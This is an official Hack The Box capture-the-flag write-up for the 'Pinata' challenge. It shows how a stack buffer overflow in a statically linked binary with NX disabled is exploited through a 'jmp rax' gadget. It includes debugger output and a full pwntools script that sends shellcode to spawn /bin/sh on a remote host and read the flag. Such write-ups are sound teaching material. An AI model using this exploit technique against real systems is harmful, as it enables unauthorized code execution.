![](assets/banner.png)



<img src="assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />    	<font size="10">Pinata</font>

​		13<sup>th</sup> September 2023 / Document No. DYY.102.XX

​		Prepared By: w3th4nds

​		Challenge Author(s): w3th4nds

​		Difficulty: <font color=green>Easy</font>

​		Classification: Official

 



# Synopsis

Pinata is an Easy difficulty challenge that features analyzing statically linked 64-bit binaries, taking advantage of the buffer overflow and `jmp rax` to execute shellcode.

## Skills Required

- Buffer Overflow, gadgets, shellcode.

## Skills Learned

- ROP with gadgets.

# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	FortifiedFortifiable	FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   2100) Symbols	  No
```

### Protections 🛡️

As we can see:

| Protection | Enabled  | Usage   |
| :---:      | :---:    | :---:   |
| **Canary** | ✅      | Prevents **Buffer Overflows**  |
| **NX**     | ❌      | Disables **code execution** on stack |
| **PIE**    | ❌       | Randomizes the **base address** of the binary |
| **RelRO**  | **Partial** | Makes some binary sections **read-only** |

Running `file`, we also notice the the binary is `64-bit` and `statically linked`.

```console
➜  challenge git:(main) ✗ file pinata 
pinata: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=2dcf43face3a1fa76053b1589acf3b6e12d2eba4, for GNU/Linux 3.2.0, not stripped
```

The interface of the program looks like this:

```console
➜  challenge git:(main) ✗ ./pinata 
██████████████████████████████████
        █
        █
        █
        █
        █       ████
        █      ██████
        █      ██ ██
 ████████████████
███████████████▬ 
  █████████████
  ██ ██  ██ ██
  ██ ██  ██ ██

Scream as much as you can to break the pinata!!

>> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
[1]    4389 segmentation fault (core dumped)  ./pinata
```

### Disassembly ⛏️

The binary indicates that there is `canary`, but trying a big payload, we can see that this is not true.

```gdb
pwndbg> cyclic 200
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
pwndbg> r
Starting program: /home/w3th4nds/github/australia/pwn/[Easy] Pinata/challenge/pinata 
██████████████████████████████████
        █
        █
        █
        █
        █       ████
        █      ██████
        █      ██ ██
 ████████████████
███████████████▬ 
  █████████████
  ██ ██  ██ ██
  ██ ██  ██ ██

Scream as much as you can to break the pinata!!

>> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401889 in reader ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────
*RAX  0x7fffffffde00 ◂— 0x6161616161616161 ('aaaaaaaa')
*RBX  0x7fffffffe018 —▸ 0x7fffffffe395 ◂— 'SHELL=/bin/bash'
*RCX  0x4c6440 (_IO_2_1_stdin_) ◂— 0xfbad208b
*RDX  0x1
*RDI  0x4c90e0 (_IO_stdfile_0_lock) ◂— 0x0
*RSI  0x1
 R8   0x0
 R9   0x0
*R10  0x80
*R11  0x246
*R12  0x1
*R13  0x7fffffffe008 —▸ 0x7fffffffe352 ◂— '/home/w3th4nds/github/australia/pwn/[Easy] Pinata/challenge/pinata'
*R14  0x4c26f0 (__preinit_array_start) —▸ 0x401780 (frame_dummy) ◂— endbr64 
*R15  0x1
*RBP  0x6161616161616163 ('caaaaaaa')
*RSP  0x7fffffffde18 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
*RIP  0x401889 (reader+30) ◂— ret 
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────
 ► 0x401889 <reader+30>    ret    <0x6161616161616164>










────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffde18 ◂— 'daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
01:0008│     0x7fffffffde20 ◂— 'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
02:0010│     0x7fffffffde28 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
03:0018│     0x7fffffffde30 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
04:0020│     0x7fffffffde38 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
05:0028│     0x7fffffffde40 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
06:0030│     0x7fffffffde48 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
07:0038│     0x7fffffffde50 ◂— 'kaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa'
──────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► f 0         0x401889 reader+30
   f 1 0x6161616161616164
   f 2 0x6161616161616165
   f 3 0x6161616161616166
   f 4 0x6161616161616167
   f 5 0x6161616161616168
   f 6 0x6161616161616169
   f 7 0x616161616161616a
   ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -o daaaaaaa
Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161)
Found at offset 24
```

Instead, we overwrote the return address at `24` bytes. So, we have control of `rip`, `PIE` is off, so we can easily perform a `ret2libc` attack, right? Wrong!

The reason is that the binary is statically linked, meaning there is no record of `system` or other function in `GOT` because everything is already in the binary.

### Debugging 

As we noticed before, `NX` is disabled, meaning we can execute code. We will take advantage of this and the lack of `PIE` and `Canary` to ROP our way around.

First of all, we need to find some useful gadgets.

```console
➜  challenge git:(main) ✗ ropper -f ./pinata --search "jmp rax"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp rax

[INFO] File: ./pinata
0x00000000004016ec: jmp rax;
```

This gadget is extremely handy to return where we have written.

Another useful "gadget" is the `jmp esp` opcode. We will combine these 2 to write to `rax`, jump there and then jump to `esp` to execute our shellcode.

# Solution

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './pinata' 

LOCAL = False

if LOCAL:
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)

sc = asm(shellcraft.execve('/bin/sh'))

payload  = b'\xff\xe4'             # jmp esp opcode
payload += b'\x90'*22
payload += p64(0x00000000004016ec) # jmp rax
payload += sc 

r.recvuntil('>> ')
r.sendline(payload)

pause(1)
r.sendline('cat flag*')
print(f'\nFlag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
```

```console
➜  htb git:(main) ✗ python solver.py 

Flag --> HTB{f4k3_fl4g_f0r_writ3up}}
```
